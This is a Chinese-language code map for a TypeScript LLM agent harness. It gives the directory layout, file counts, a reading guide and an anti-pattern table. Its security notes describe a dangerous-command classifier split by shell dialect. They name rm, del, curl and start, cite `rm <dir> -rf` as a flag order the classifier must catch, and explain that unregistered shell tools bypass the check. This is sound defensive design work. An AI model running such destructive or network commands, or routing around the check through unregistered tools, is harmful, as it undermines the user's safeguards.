│   │   ├── 0030-security-dichotomy.md             ← ADR-030 安全二分（shell vs im/tools）
│   │   └── 0031-tool-compression-and-system-agent-memory.md ← ADR-031 工具级压缩 + 交接笔记
│   │   └── 0032-file-recovery-and-rewind.md        ← ADR-032 文件可恢复（快照 + session.rewind）
│   │   └── 0033-prompt-model-family-routing.md     ← ADR-033 提示词模型族路由（唯一基底 + 双槽位）
│   └── plans/
│       ├── v0.10.1-{index,a,b,c}.md   ← v0.10.1 三步实现计划
│       ├── v0.10.2-state-line.md      ← v0.10.2 state-line 实现计划
│       ├── v0.10.3-context-injection.md ← v0.10.3 计划（依赖 v0.10.2）
│       ├── v0.13-mcp-skill-extension.md ← v0.13 MCP/Skill 扩展计划
│       └── v0.13.1-wiki-system-agent.md ← v0.13.1 Wiki System Agent 计划
├── src/
│   ├── shared/              ← 跨层共享的纯类型
│   │   ├── json-schema.ts   ← JSONSchema (shell + protocol 都依赖)
│   │   └── tool-context.ts  ← ToolContext (v0.13 NEW — sub-agent policy 共享)
│   ├── shell/               ← 状态机 + guards + 工具注册 + prompt compose
│   │   ├── state.ts         ← 3 态枚举
│   │   ├── metrics.ts       ← 7 字段 metrics（每个字段都有 producer + guard reader）
│   │   ├── config.ts        ← ShellConfig 阈值（每个字段都被 guards.ts 读）
│   │   ├── guards.ts        ← 5 个内置 guard（token/iter/toolRate/time/errorRate）
│   │   ├── gate.ts          ← gate(state, hits) → 拒 if Tripped/Dead
│   │   ├── registry.ts      ← 统一 ToolRegistry（启动期注册，无热插拔）
│   │   ├── compose.ts       ← 6 part types → FinalPrompt
│   │   └── call.ts          ← shellCall(deps, prompt) → { response, updatedMetrics, toolCalls }
│   ├── protocol/            ← OpenAI 兼容
│   │   ├── types.ts         ← ChatMessage / ToolCall / OpenAITool / StreamChunk / Usage
│   │   ├── client.ts        ← streamChat(url, req, opts) → AsyncIterable<StreamChunk>
│   │   ├── stream.ts        ← SSE 解析
│   │   ├── retry.ts         ← withRetry(429/503, 5x, exp backoff)
│   │   └── tool-calls.ts    ← parseToolCallArguments / accumulateToolCall / finalizeToolCalls
│   ├── mcp/                 ← MCP 连接层 (v0.13 NEW — SDK 隔离于此目录)
│   │   ├── connection.ts    ← McpConnection narrow interface (listTools/callTool/close，callTool 返回 string)
│   │   ├── boot.ts          ← bootstrapExtensions 一次性装配（fail-fast + idempotent close）
│   │   ├── config.ts        ← MCP/skill 配置解析（stdio + HTTP dual transport）
│   │   ├── version.ts       ← SDK 版本探测
│   │   └── index.ts         ← re-export
│   ├── skills/              ← JS/TS 模块 skill 加载 (v0.13 NEW)
│   │   ├── loader.ts        ← loadSkillsFromDir (扫描 .ts/.js/.mts/.mjs + dynamic import + 校验 name/description/execute)
│   │   ├── text-loader.ts   ← text skill 预注入（prompt compose 前置）
│   │   └── index.ts         ← re-export
│   ├── extensions.ts        ← resolveRef 单分类器 (system→mcp→skill，与 execute dispatch 对齐) (v0.13 NEW)
│   ├── mcp-servers/         ← 内置 MCP server 实现 (v0.13.1 NEW — 计划已落盘，代码待实现)
│   │   └── wiki-mcp/        ← code-domain wiki MCP server (ADR-019)
│   │       ├── server.js    ← MCP stdio 主循环 + 15 核心工具 + scan_codebase + render_md (wiki__ 前缀)
│   │       ├── lib/         ← config.js (代码领域 6 类型映射) / store.js / search.js / scan-codebase.js
│   │       ├── visualizer/  ← export-md.js (MD 渲染，复用 literature 管线)
│   │       ├── data/        ← 数据存储 (modules/interfaces/functions/classes/patterns/concepts .json + relations.json)
│   │       └── tests/       ← wiki-mcp server 测试
│   └── im/                  ← 业务核心
│       ├── turn.ts          ← Turn 联合类型（ToolTurn + ConversationTurn）+ turnToMessage
│       ├── databus.ts       ← role:'tool' only append-only 日志（query/subscribe/turns）
│       ├── conversation-memory.ts ← role:'user'/'assistant' turns 独立存储 (v0.10.1 NEW)
│       ├── loop.ts          ← runIMLoop + executeToolCalls + advanceElapsed（工具并发上限 = 2）
│       ├── context-projection.ts ← buildContextProjection M0-M3 动态投影 (v0.10.3 NEW)
│       ├── minimal.ts       ← createMinimalIM(opts) factory (v0.10.1 NEW)
│       ├── system-agent.ts  ← createSystemAgent factory (v0.10.1 NEW)
│       ├── memory-layers.ts ← classifyMemoryLayer M0-M3 if-else 分类器 + emitLayerSignal (v0.10 NEW)
│       ├── mailbox/         ← Mailbox class (v0.10.1 NEW)
│       │   ├── mailbox.ts   ← send/readOwnInbox/markRead/hasUnread/inboxSize
│       │   ├── types.ts     ← MailItem / AgentId
│       │   └── index.ts     ← re-export
│       ├── system-agents/   ← 3 system agent 注册 (v0.10.1 NEW)
│       │   ├── index.ts     ← createSystemAgents(deps) → { warehouse, compressor, recall }
│       │   ├── register.ts  ← registerSystemAgentTools(registry, mailbox, workingAgentId, systemAgents, stateLine)
│       │   └── drive-coordinator.ts ← v0.10.4 auto-drive 协调器 (find-task-block 配套)
│       ├── state-line/      ← filesystem-persistent 分层视图 (v0.10.2 NEW)
│       │   ├── types.ts     ← CuratedMemory (11-field) / M3Summary / StampRecord / ToolContext / StateLine
│       │   ├── jsonl-writer.ts ← appendJsonl<T> (mkdir -p + appendFile)
│       │   ├── append-stamp.ts ← appendStamp (no dedup)
│       │   ├── chroma-bridge.ts ← embedM3 + queryM3 (spawn embed.py, 15s timeout)
│       │   └── index.ts     ← createStateLine(config?) factory
│       ├── sub-agent/       ← 子代理边界 + 安全壳子 (v0.11 NEW / v0.12 扩展 / v0.13 policy 开放)
│       │   ├── policy.ts    ← SubAgentToolPolicy（v0.13 NEW — 推翻 v0.12.2 blanket ban，default='allow'）
│       │   ├── tree.ts      ← AgentTree + AgentNode 层级树 + UUID instance id + rebindRoot (v0.12 NEW)
│       │   ├── databus-boundary.ts ← two-bus (ctxDatabus + MultiDatabus) 隔离 (v0.11 NEW)
│       │   ├── registry.ts  ← 子代理工具注册 + policy 过滤
│       │   └── index.ts     ← re-export
│       ├── prompts/         ← 4 agent system prompt .md (v0.10.1 NEW)
│       │   ├── index.ts     ← loader
│       │   ├── working-agent.md
│       │   ├── warehouse-agent.md
│       │   ├── compressor-agent.md
│       │   └── recall-agent.md
│       └── tools/
│           ├── index.ts     ← createBuiltinTools({cwd}) 工厂 + wrap()
│           ├── validate.ts   ← requireReason + wrapReason (共享)
│           ├── helpers.ts    ← wrapTool 统一加固路径 (v0.10.2.1 — reason 校验 + throw 转干净英文句子)
│           ├── read.ts / write.ts / edit.ts
│           ├── ls.ts / find.ts / grep.ts
│           ├── bash.ts / powershell.ts
│           ├── path.ts      ← 路径工具
│           ├── shell.ts     ← bash/powershell 共享 shell 抽象
│           ├── glob.ts      ← 手写 glob 子集（*, **, ?）
│           ├── databus-query.ts      ← v0.10.1 NEW
│           ├── databus-subscribe.ts  ← v0.10.1 NEW
│           ├── state-query.ts        ← v0.10.1 NEW, v0.10.2 stub→real (jsonl + RAG)
│           ├── compress-block.ts     ← v0.10.1 NEW (v0.12.3 atomized replacement)
│           ├── ask-recall.ts         ← v0.10.1 NEW
│           ├── mailbox-send.ts       ← v0.10.1 NEW (v0.12.1 + sentStatus receipt)
│           ├── mailbox-read.ts       ← v0.10.1 NEW
│           └── mailbox-markread.ts   ← v0.12.1 NEW (markRead 独立工具)
├── scripts/
│   └── embed.py             ← Node→Python RAG bridge (v0.10.2 wired via chroma-bridge.ts)
├── tests/
│   ├── shell/               ← 8 个测试文件
│   ├── protocol/            ← 4 个测试文件
│   ├── im/                  ← 63 个测试文件（含 mailbox/ + system-agent + state-line/ + context-projection + prompts + 7 新工具 + JSONL recovery + sub-agent/ + loop-run-subagent + memory-layers + drive-coordinator）
│   ├── mcp/                 ← MCP 连接层测试 (v0.13 NEW)
│   ├── skills/              ← skill loader 测试 (v0.13 NEW)
│   └── extensions.test.ts   ← resolveRef + bootstrapExtensions 测试 (v0.13 NEW)
├── examples/
│   ├── minimal.ts           ← 最简 runIMLoop 跑通
│   ├── guard-demo.ts        ← 故意触发 guard 演示终止
│   ├── tool-flow.ts         ← tool_call → result → 下一轮 演示
│   ├── sub-agent-harness.ts ← v0.11 子智能体双 Databus 边界端到端演示
│   ├── real-llm-adapter.ts  ← v0.11.2 真实 LLM 适配器（Bearer 注入 + 3→2 arg 桥接）
│   ├── real-llm-monitor.ts  ← v0.11.2 真实 LLM 监控脚本（trace token/tool/guard/final）
│   ├── mcp-stdio.ts         ← v0.13 stdio MCP 连接示例
│   ├── mcp-http.ts          ← v0.13 HTTP MCP 连接示例
│   ├── skill-load.ts        ← v0.13 JS/TS 模块 skill 加载示例
│   ├── sub-agent-policy.ts  ← v0.13 子代理 policy 开放工具示例
│   ├── resolve-ref.ts       ← v0.13 resolveRef 单分类器示例
│   └── bootstrap-extensions.ts ← v0.13 一键装配示例
├── package.json             ← 1 运行时依赖：@modelcontextprotocol/sdk ^1.30.0（devDeps: typescript/vitest/tsx）
├── tsconfig.json            ← strict + exactOptionalPropertyTypes
└── vitest.config.ts
```

---

## 8.1 当前全量目录清单（快照日期见下；文件数以 2026-09-22 · v0.44 为准）

**规模**（2026-09-22 校正）：`src/` **178** 个 `.ts`；`tests/` **258** 个 `.test.ts`（3039 通过 / 1 skip / 1 todo）；`docs/` **96** 个 md（顶层 19 篇 + `docs/adr/` 23 篇 ADR 文本 + `docs/plans/` 54 篇计划）。

**`src/` 按目录**（文件数 / 职责）：

| 目录 | 文件数 | 职责 | 关键入口 |
|---|---|---|---|
| `src/shell/` | 9 | 状态机 + guards + ToolRegistry + compose + call | `registry.ts` `guards.ts` `call.ts` |
| `src/protocol/` | 5 | OpenAI 兼容 SSE + 重试 + tool-call 累积 | `client.ts` `tool-calls.ts` |
| `src/im/` | 100 | 业务核心（下钻见下表） | `loop.ts` `minimal.ts` |
| `src/security/` | 7 | SecurityRouter + 3 个 SecurityDoor（危险命令 / 敏感路径 / 写审批） | `router.ts` `doors/dangerous-command.ts` |
| `src/signals/` | 14 | Signal Gate：前后端信息流唯一管理点 + 会话排队 + 装配 + 接线 | `gate.ts` `session-queue.ts` `assemble.ts` |
| `src/host/` | 9 | 宿主装配：config / MCP / skill / session / tools → 可跑 harness；含 wiki 生成与 workspace 读 | `assembly.ts` |
| `src/config/` | 7 | databus 设置 + 模型能力表 + 路径与读写 | `load.ts` `model-capabilities.ts` |
| `src/rendering/` | 7 | 渲染基座（规则 + hooks + md 渲染 + 渲染期信号总线） | `render-md.ts` `signal-bus.ts` |
| `src/webshell/` | 4 | Web UI 服务端（auth / server / stream） | `server.ts` |
| `src/mcp/` | 6 | MCP 连接层（SDK 隔离于此目录） | `connection.ts` `boot.ts` |
| `src/mcp-servers/` | 1 | 内置 MCP server（wiki-mcp） | `wiki-mcp/` |
| `src/skills/` | 3 | JS/TS 模块 skill 加载 | `loader.ts` |
| `src/shared/` | 4 | 跨层纯类型 | `json-schema.ts` `tool-context.ts` |
| 根文件 | 2 | 公开 API 面 + 一键装配 | `index.ts` `extensions.ts` |

**`src/im/` 下钻**：

| 子目录 | 文件数 | 职责 |
|---|---|---|
| `tools/` | 44 | 29 个工具实现 + `helpers.ts`（wrapTool 统一加固）+ `security/`（approval-hook / approval-store / **dangerous-command** / sensitive-path） |
| `hooks/` | 11 | HookSystem 点位：审计 / 上下文注入 / 错误恢复（v0.34 决议：保留为可观测性，不接线） |
| `prompt/` | 6 | 分层 prompt 拼装（layer / section builder）+ 静态提示词 |
| `session/` | 6 | 多会话：manager / store（落盘）/ recovery / bus-registry |
| `state-line/` | 5 | filesystem-persistent 分层视图（M1/M2/M3）+ chromadb RAG |
| `sub-agent/` | 5 | AgentTree + policy + databus 边界 + 注册 |
| `system-agents/` | 4 | warehouse / compressor / recall 注册 + drive-coordinator（auto-drive） |
| `mailbox/` | 3 | agent 间私有 FIFO（v0.34 起落盘 + 3 天 TTL） |
| `compaction/` | 3 | 压缩引擎 + handoff prompt |
| `prompts/` | 1 | system prompt loader（.md 正文在此目录） |
| 根文件 | 12 | `loop.ts` `loop-hooks.ts` `turn.ts` `databus.ts` `multi-databus.ts` `conversation-memory.ts` `context-projection.ts` `memory-layers.ts` `dynamic-tool-context.ts` `system-agent.ts` `system-agent-persistence.ts` `minimal.ts` |

**`tests/` 按目录**（文件数）：`im/` 129 · `signals/` 15 · `host/` 12 · `cli/` 11 · `shell/` 10 · `mcp/` 7 · `rendering/` 7 · `webshell/` 6 · `protocol/` 5 · `config/` 4 · `security/` 3 · `skills/` 3 · `meta/` 1 · `shared/` 1 · 根 2。

**`docs/`**：`CODE_MAP.md`(本文件) · `ARCHITECTURE.md` · `DECISIONS.md`(ADR-001→036 全量汇总) · `IM-GUIDE.md` · `adr/`(0016→0036 全文本) · `plans/`(v0.10→v0.44 计划) 等。

---

## 9. 怎么读这份代码（给新读者）

1. 先看本文件 §1-3（10 分钟），建立三层 + 数据流的心智模型
2. 看 `examples/minimal.ts`，跑一次 `npm install && npx tsx examples/minimal.ts`
3. 看 `src/im/loop.ts`，理解 IM 怎么编排 + 怎么执行 tool
4. 看 `src/shell/call.ts`，理解 shell 怎么 gate + 调 protocol
5. 看 `src/im/tools/validate.ts` + 8 个工具的 `execute()`，理解工具自验证 contract
6. 看 `docs/DECISIONS.md` 19 条 ADR，记住为什么是这样
7. 想加新工具？看 `docs/IM-GUIDE.md` "Adding a new system tool" 一节
8. 想接 MCP / 写 skill？看 `docs/adr/0018-mcp-skill-extension.md` + `examples/bootstrap-extensions.ts`
9. 想加 wiki system agent / code-domain 知识库？看 `docs/adr/0019-wiki-system-agent.md` + `docs/plans/v0.13.1-wiki-system-agent.md`
10. 想改安全策略（什么命令要审批、什么路径不给读）？看 `src/im/tools/security/dangerous-command.ts`（**分类器本体，单一评估点**）+ `src/security/doors/`（门禁消费端）+ `docs/adr/0022-*` / `0023-*` / `0030-security-dichotomy.md`。
    - 注意 **`checkDangerousCommand(command, shell)` 的第二个参数是必须想清楚的东西**：`bash` 与 `powershell` 在 `rm` / `del` / `curl` / `start` 上语义不同，POSIX 表与 PowerShell 表按方言分派（v0.35）。新加规则时先问"这条规则属于哪个 shell"。
11. 想看前后端信息流 / 会话排队？看 `src/signals/gate.ts`（纯路由）+ `src/signals/session-queue.ts`（同会话串行、跨会话并行）+ `docs/adr/0026-signal-gate.md`。
12. 想改架构？先写 ADR，**所有架构改动必须从 ADR 开始**

---

## 10. 反模式（不要做）

| 错 | 对 |
|---|---|
| 在 prompt 里写 `if shell.tripped, say "I see you've been rate limited"` | shell 状态永不进 prompt（ADR-004） |
| 给 tool schema 加 `required: ['reason']` | 工具 execute 入口自验证 reason（避免严格 schema 服务报错） |
| 写 `try { try { try {} } catch {} } catch {}` | 一层代码 + 测试覆盖（ADR-009） |
| 在 protocol 层加业务逻辑（"如果是宿主应用 就..."） | protocol 是纯函数，IM 做编排 |
| 调 `registry.registerSystemTool(...)` 在 runtime | 启动时一次注册完（ADR-006） |
| 给 shell 加 `state === 'Recovering'` | 3 态，guard 是硬终止（ADR-002） |
| 跨层 import（protocol import shell） | 依赖方向硬约束（§3） |
| 在 tool result content 前加 `error: ` 前缀 | deepseek 风格：`Tool "X" failed: <msg>`（ADR-013） |
| 在 `role: 'tool'` 加 `isError: true` 字段 | OpenAI 协议不接受，IM 内部记账走 metrics（ADR-013） |
| 在 Phase 1 代码里塞 Phase 2-4 特性 | 每个 phase 独立 ADR + 测试（ADR-012） |
| 把两套 shell 的模式表合成一张不区分方言的表 | POSIX 与 PowerShell 同名不同义（`rm`/`del`/`curl`/`start`）——分类器必须收 `shell` 参数（v0.35 / ADR-022 修订） |
| 分类器对宽容写法只扫 token 前缀就下结论 | 扫**全部** token 再判定（`rm <dir> -rf` 是合法 GNU 写法，v0.35） |
| 报告缺陷只列函数名和改动点 | 先讲清"为什么错、错在哪个环节、实测证据是什么"，再讲怎么改（用户约定） |
| 新增 shell 类工具（cmd / pwsh / wsl / sh）不登记进 door 的 `SHELL_TOOLS` | 必须同时登记 `SHELL_TOOLS` + `SHELL_KIND_BY_TOOL`（`src/security/doors/dangerous-command.ts`）——door 对未知工具名一律 `allow: true`，漏登记 = 该工具完全不受危险命令检查（静默 fail-open） |
| 把安全判定搬到工具自描述里（`ToolDefinition.category` / `parallelSafe`） | 这两个字段是**并发**语义（ADR-025 T8）；安全是 door 层的 deny-override（ADR-030 安全二分）。两者不要互相迁移（用户 2026-09-11 明确要求不要偏离设计） |
| 认为“私有系统工具没进某 agent 的 `toolRefs`”或“execute 有身份守卫”就等于其他 agent 不可见 | 私有工具名必须在所有公开工具来源中全局保留（system / MCP flat / module skill / text skill），碰撞处理必须与注册顺序无关。`buildServerSummary` / `load_tools` 读全局 loadable metadata，不按 agent 过滤；运行时拒绝只是纵深防御 |
